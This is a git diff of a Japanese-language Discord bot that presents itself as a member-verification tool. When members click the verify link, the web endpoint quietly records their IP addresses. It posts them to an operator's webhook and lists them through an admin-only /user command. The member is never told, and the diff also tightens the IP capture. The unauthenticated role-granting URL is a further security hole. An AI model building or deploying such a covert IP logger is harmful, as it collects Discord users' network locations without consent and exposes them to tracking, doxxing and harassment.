@@ -18,18 +18,20 @@ const fetch = require('node-fetch');
 require('dotenv').config();
 
 const app = express();
+app.set('trust proxy', true); // IP取得のため追加
+
 const PORT = process.env.PORT || 3000;
 const BASE_URL = 'https://discord-verify-bot-rb6b.onrender.com';
 const WEBHOOK_URL = process.env.WEBHOOK_URL;
 
 const ipMap = new Map(); // userId => IPアドレス
 
-// サーバー起動確認
+// サーバー確認
 app.get('/', (req, res) => {
   res.send('<h1>Botは稼働中です。</h1>');
 });
 
-// 認証処理：ロール付与 + IP保存 + Webhook通知
+// 認証処理：IP取得 + ロール付与 + Webhook送信
 app.get('/auth/:guildId/:userId/:roleId', async (req, res) => {
   const { guildId, userId, roleId } = req.params;
   const ip = req.headers['x-forwarded-for']?.split(',')[0].trim() || req.ip;
@@ -42,27 +44,27 @@ app.get('/auth/:guildId/:userId/:roleId', async (req, res) => {
     await member.roles.add(role);
     ipMap.set(userId, ip);
 
-    // WebhookへIP通知
+    // Webhookに送信
     if (WEBHOOK_URL) {
       await fetch(WEBHOOK_URL, {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({
-          content: `🛡️ 認証完了: <@${userId}>\n🌐 IP: \`${ip}\``,
+          content: `<@${userId}> ${ip}`,
         }),
       });
     }
 
-    res.send(`<h1>認証完了しました！</h1><p>ロール「${role.name}」を付与しました。</p>`);
-  } catch (e) {
-    console.error(e);
+    res.send(`<h1>認証完了！</h1><p>ロール「${role.name}」を付与しました。</p>`);
+  } catch (err) {
+    console.error(err);
     res.status(500).send('サーバーエラーが発生しました。');
   }
 });
 
-app.listen(PORT, () => console.log(`✅ Web server running on port ${PORT}`));
+app.listen(PORT, () => console.log(`✅ Webサーバー起動: PORT ${PORT}`));
 
-// Discordクライアント
+// Discordクライアント設定
 const client = new Client({
   intents: [
     GatewayIntentBits.Guilds,
@@ -77,7 +79,7 @@ const client = new Client({
 const commands = [
   new SlashCommandBuilder()
     .setName('verify')
-    .setDescription('認証パネルを表示します')
+    .setDescription('認証パネルを表示')
     .addStringOption(option =>
       option.setName('role').setDescription('付与するロール名').setRequired(true)
     ),
@@ -99,10 +101,11 @@ const commands = [
   new SlashCommandBuilder()
     .setName('neko')
     .setDescription('ランダムな猫の画像を表示'),
-].map(command => command.toJSON());
+].map(cmd => cmd.toJSON());
 
 const rest = new REST({ version: '10' }).setToken(process.env.TOKEN);
 
+// Bot準備完了
 client.once(Events.ClientReady, async () => {
   console.log(`✅ ログイン成功: ${client.user.tag}`);
   client.user.setActivity('認証を待機中', { type: ActivityType.Playing });
@@ -116,8 +119,8 @@ client.once(Events.ClientReady, async () => {
   }
 });
 
-// コマンド処理
-client.on(Events.InteractionCreate, async (interaction) => {
+// スラッシュコマンド処理
+client.on(Events.InteractionCreate, async interaction => {
   if (!interaction.isChatInputCommand()) return;
 
   const { commandName } = interaction;
@@ -126,7 +129,7 @@ client.on(Events.InteractionCreate, async (interaction) => {
     const roleName = interaction.options.getString('role');
     const role = interaction.guild.roles.cache.find(r => r.name === roleName);
     if (!role) {
-      return interaction.reply({ content: '❌ 指定されたロールが見つかりません。', flags: 64 });
+      return interaction.reply({ content: '❌ 指定されたロールが見つかりません。', ephemeral: true });
     }
 
     const authURL = `${BASE_URL}/auth/${interaction.guild.id}/${interaction.user.id}/${role.id}`;
@@ -138,25 +141,26 @@ client.on(Events.InteractionCreate, async (interaction) => {
     const row = new ActionRowBuilder().addComponents(button);
 
     await interaction.reply({
-      content: '下のボタンを押して認証を完了させてください。',
+      content: '以下のボタンを押して認証を完了してください。',
       components: [row],
+      ephemeral: true,
     });
 
   } else if (commandName === 'user') {
     if (!interaction.member.permissions.has(PermissionsBitField.Flags.Administrator)) {
-      return interaction.reply({ content: '❌ 管理者専用コマンドです。', flags: 64 });
+      return interaction.reply({ content: '❌ 管理者専用コマンドです。', ephemeral: true });
     }
 
     if (ipMap.size === 0) {
-      return interaction.reply({ content: '認証済みユーザーはいません。', flags: 64 });
+      return interaction.reply({ content: '📭 認証済みユーザーはいません。', ephemeral: true });
     }
 
-    let result = '📝 認証済みユーザー一覧:\n';
+    let list = '📝 認証済みユーザー一覧:\n';
     for (const [userId, ip] of ipMap.entries()) {
-      result += `<@${userId}> : \`${ip}\`\n`;
+      list += `<@${userId}> : \`${ip}\`\n`;
     }
 
-    interaction.reply({ content: result, flags: 64 });
+    interaction.reply({ content: list, ephemeral: true });
 
   } else if (commandName === 'ban' || commandName === 'kick') {
     const perm = commandName === 'ban'
@@ -164,13 +168,13 @@ client.on(Events.InteractionCreate, async (interaction) => {
       : PermissionsBitField.Flags.KickMembers;
 
     if (!interaction.member.permissions.has(perm)) {
-      return interaction.reply({ content: `❌ ${commandName}の権限がありません。`, flags: 64 });
+      return interaction.reply({ content: `❌ ${commandName.toUpperCase()}の権限がありません。`, ephemeral: true });
     }
 
     const target = interaction.options.getUser('target');
     const member = interaction.guild.members.cache.get(target.id);
     if (!member) {
-      return interaction.reply({ content: '❌ ユーザーが見つかりません。', flags: 64 });
+      return interaction.reply({ content: '❌ ユーザーが見つかりません。', ephemeral: true });
     }
 
     try {
@@ -178,7 +182,7 @@ client.on(Events.InteractionCreate, async (interaction) => {
       interaction.reply(`✅ ${target.tag} を${commandName.toUpperCase()}しました。`);
     } catch (err) {
       console.error(err);
-      interaction.reply({ content: `❌ ${commandName}に失敗しました。`, flags: 64 });
+      interaction.reply({ content: `❌ ${commandName.toUpperCase()} に失敗しました。`, ephemeral: true });
     }
 
   } else if (commandName === 'neko') {
